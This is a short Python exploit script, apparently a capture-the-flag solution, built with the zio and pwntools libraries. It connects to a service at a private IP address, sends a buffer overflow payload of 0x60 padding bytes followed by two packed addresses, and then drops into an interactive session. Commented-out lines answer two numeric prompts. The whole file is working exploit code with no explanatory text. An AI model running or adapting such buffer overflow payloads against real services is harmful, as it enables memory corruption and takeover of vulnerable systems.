from zio import *
import pwn
# p = zio("./pwn")
p = zio(("192.168.5.56",8888))

# p.read_until("\n")
p.write("a"*(0x60)+pwn.p32(0x0804A024)+pwn.p32(0x0804A024))



# p.read_until("e1 : ")
# p.write(str(0x528E6))
# p.read_until("e2 : ")
# p.write(str(0xCC07C9))


p.interact()